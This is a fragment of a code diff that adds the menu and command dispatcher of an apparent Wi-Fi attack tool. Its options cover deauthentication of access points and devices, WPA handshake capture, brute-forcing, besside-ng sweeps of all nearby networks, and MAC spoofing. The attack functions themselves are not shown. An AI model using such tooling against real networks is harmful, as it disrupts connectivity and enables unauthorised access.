+            f"{green('2)')} Select a {yellow('target OUI')}",
+            f"{green('3)')} Select a {yellow('target Device')} in {yellow('target AP')}",
+            f"{blue('------------------------------------------------------------------')}",
+            f"{green('U)')} UPDATE NETWORK INFORMATION",
+            f"{blue('------------------------------------------------------------------')}",
+            f"{green('D1)')} Deauth {yellow('target AP')}",
+            f"{green('D2)')} Deauth {yellow('target Device')} in {yellow('target AP')}",
+            f"{green('D3)')} Deauth {yellow('All AP`s')}      in {yellow('target OUI')} (interval/roundrobin) ",
+            f"{green('D4)')} Deauth {yellow('ALL Devices')}   in {yellow('target AP')}  (interval/roundrobin)",
+            f"{blue('------------------------------------------------------------------')}",
+            f"{green('C1)')} Capture Packets   on      {yellow('target AP')}",
+            f"{green('C2)')} Capture Handshake of      {yellow('target AP')}",
+            f"{green('C3)')} Bruteforce attack on      {yellow('target AP')} with Capture File",
+            f"{green('C4)')} Decrypt Capture Packet of {yellow('target AP')} (WPA/WPA2)",
+            f"{blue('------------------------------------------------------------------')}",
+            f"{green('B1)')} Deauth and Capture Handshake of {yellow('ALL Networks')} in range {red('(Besside-ng)')}",
+            f"{green('B2)')} Deauth and Capture Handshake of {yellow('target AP')} {red('(Besside-ng)')}",
+            f"{blue('------------------------------------------------------------------')}",
+            f"{green('G1)')} Graph the Network using Capture File",
+            f"{blue('------------------------------------------------------------------')}",
+            f"{yellow('Interface')}         {green(':')}  {cyan(selected_interface)}",
+            f"{yellow('Interface MODE')}    {green(':')}  {cyan(interface_mode)}",
+            f"{yellow('Interface MAC ')}    {green(':')}  {cyan(interface_mac_address)}",
+            f"{blue('------------------------------------------------------------------')}",
+            f"{yellow('target AP SSID')}    {green(':')}  {cyan(target_ap)}",
+            f"{yellow('target AP AUTH')}    {green(':')}  {cyan(target_ap_authentication)}",
+            f"{yellow('target AP BSSID')}   {green(':')}  {cyan(target_bssid)}",
+            f"{yellow('target AP CHANNEL')} {green(':')}  {cyan(target_channel)}",
+            f"{yellow('target OUI')}        {green(':')}  {cyan(target_router_oui)}",
+            f"{yellow('target DEVICE')}     {green(':')}  {cyan(target_device)}",
+            f"{blue('------------------------------------------------------------------')}",
+            f"{green('reset)')}",
+            f"{green('return)')}",
+            f"{green('exit)')}",
+            f"{blue('------------------------------------------------------------------')}",
+        ]
+
+        Section[1]()
+        print("type exit to close the program",
+              "type 999 to return to previous section\n")
+
+        match input(f"{magenta('jukebox > ')}").lower():
+            case "test":
+                selected_interface = "wlan0"
+                select_target_oui()
+                input()
+            case "return":
+                Section = Previous_Section
+            case "exit":
+                break
+            case "reset":
+                if Section[0] == "Wireless":
+                    selected_interface = ""
+                    target_ap = ""
+                    target_bssid = ""
+                    target_channel = ""
+                    target_device = ""
+                    target_ap_authentication = ""
+                    target_router_oui = ""
+                    interface_mac_address = ""
+                    ap_list_of_target_oui = []
+                    device_list_of_target_ap = []
+                    ssid_map = {}
+                    ssid_counter = ''
+                    terminal_pids = []
+                    Section = Interface
+                    Previous_Section = Interface
+            case '1':
+                if Section[0] == "Interface":
+                    change_interface()
+                elif Section[0] == "Wireless":
+                    select_target_ap()
+            case '2':
+                if Section[0] == "Interface":
+                    switch_interface_to_monitor_mode()
+                elif Section[0] == "Wireless":
+                    select_target_oui()
+            case '3':
+                if Section[0] == "Interface":
+                    switch_interface_to_managed_mode()
+                elif Section[0] == 'Wireless':
+                    select_target_device()
+            case '4':
+                if Section[0] == "Interface":
+                    spoof_mac_of_interface_with_random_byte()
+            case 'u':
+                if Section[0] == "Wireless":
+                    selected_interface = ""
+                    target_ap = ""
+                    target_bssid = ""
+                    target_channel = ""
+                    target_device = ""
+                    target_ap_authentication = ""
+                    target_router_oui = ""
+                    interface_mac_address = ""
+                    ap_list_of_target_oui = []
+                    device_list_of_target_ap = []
+                    ssid_map = {}
+                    ssid_counter = ''
+                    terminal_pids = []
+            case 'd1':
+                if Section[0] == "Wireless":
+                    deauthentication()
+            case 'd2':
+                if Section[0] == "Wireless":
+                    deauth_target_device()
+            case 'd3':
+                if Section[0] == "Wireless":
+                    deauth_by_oui()
+            case 'd4':
+                if Section[0] == "Wireless":
+                    deauth_devices_in_target_ap()
+            case 'c1':
+                if Section[0] == "Wireless":
+                    capture_packets()
+            case 'c2':
+                if Section[0] == "Wireless":
+                    capture_handshake()
+            case 'c3':
+                if Section[0] == "Wireless":
+                    bruteforce_handshake_capture()
+            case 'c4':
+                if Section[0] == "Wireless":
+                    airdecap_wpa()
+            case 'b1':
+                if Section[0] == "Wireless":
+                    besside()
+            case 'b2':
+                if Section[0] == "Wireless":
+                    besside_target_ap()
+            case 'g1':
+                if Section[0] == "Wireless":
+                    graph_networks()
+            case 'n':
+                if selected_interface == "":
+                    print("Cannot continue with wireless attacks without selecting a interface")
+                    input('Press enter to continue')
+                elif not check_if_selected_interface_in_monitor_mode():
+                    print(f"Cannot continue with wireless attacks without {green('Monitor Mode')}")
+                    if input(f'Switch {green(selected_interface)} to monitor mode Y/N : ').lower() == 'y':
+                        switch_interface_to_monitor_mode()
+                elif Section[0] == "Interface":
+                    Previous_Section = Section
+                    Section = Wireless
